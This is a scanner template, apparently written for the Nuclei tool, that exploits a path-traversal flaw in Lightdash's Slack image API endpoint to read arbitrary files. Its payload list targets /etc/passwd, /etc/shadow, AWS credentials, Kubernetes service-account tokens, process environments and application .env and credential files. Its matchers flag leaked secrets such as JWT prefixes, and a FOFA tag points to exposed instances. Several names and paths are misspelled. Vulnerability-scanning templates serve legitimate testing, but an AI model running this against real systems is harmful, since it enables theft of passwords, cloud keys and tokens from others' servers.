http:
- extractors:
  - dsl:
    - body
    type: dsl
  matchers:
  - status:
    - 200
    type: status
  - condition: or
    type: word
    words:
    - 'root:x:'
    - PATH=
    - 'verion:'
    - LIGHTDASH
    - PASS
    - AWS
    - eyJhb
  matchers-condition: and
  path:
  - '{{ BaseURL }}/api/v1/slack/image/slack-image{{ url_encode(concat(''/../../../../..'',
    file)) }}'
  payloads:
    file:
    - /etc/passwd
    - /etc/shadow
    - '%2Fetc%2Fpasswd'
    - /root/.aws/credentials
    - /var/run/secrets/kubernetes.io/serviceaccount/token
    - /proc/1/environ
    - /proc/80/environ
    - /proc/81/environ
    - /proc/82/environ
    - /proc/83/environ
    - /proc/self/environ
    - /usr/app/.devcontainer/devcontainer.json
    - /usr/app/.env
    - /usr/app/.env.local
    - /usr/app/.env.prodction
    - /usr/app/.env.prodction.local
    - /usr/app/.env.test.local
    - /usr/app/credentials.json
    - /usr/app/lightdash.yml
    - /usr/app/lightdash_dev.yml
    - /usr/app/docker-compose.yml
id: lightdsah-file-read
info:
  author: Esonhugh-self-maintained
  description: 'lightdash has an api endpoint to read slack image but it can abused
    to read arbitray file

    '
  metadata:
    fofa: lightdash
  name: lightdash api file read
  severity: high
  tags: lfi,file-read,lightdash,api
